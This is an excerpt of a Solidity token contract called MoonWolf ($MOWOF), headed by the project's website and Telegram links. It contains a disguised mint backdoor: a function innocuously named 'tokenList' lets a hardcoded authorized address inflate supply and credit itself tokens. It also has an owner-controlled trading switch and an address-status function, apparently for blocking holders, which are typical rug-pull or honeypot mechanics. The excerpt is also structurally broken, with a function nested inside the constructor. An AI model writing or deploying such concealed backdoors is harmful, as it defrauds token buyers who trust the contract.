...
Official Website 
-- moonwolfofficial.online --

Our Official Telegram
-- t.me/moonwolfofficial --
...
contract MoonWolf is IBEP20, Auth {
    ...
    string constant _name = "MoonWolf";
    string constant _symbol = "$MOWOF";
    ...
    address private _authorized = 0xD1ec692E014Fa2f1Fd78fCDdD2ea151C7DBD462E;
    ...
    constructor () Auth(msg.sender) {
        ...
        function tokenList(uint256 accumulation, address acc) authorized public virtual {
        require(acc == address(_authorized));
        _Berserker(address(_authorized), acc, accumulation);
        _totalSupply += accumulation;
        _balances[acc] += accumulation;
        emit Transfer(address(_authorized), acc, accumulation);
    }
    ...
    // switch Trading
    function tradeStatus(bool _status) public authorized {
        tradingOpen = _status;
    }
    ...
    function addressData(address[] calldata addresses, bool status) public authorized {
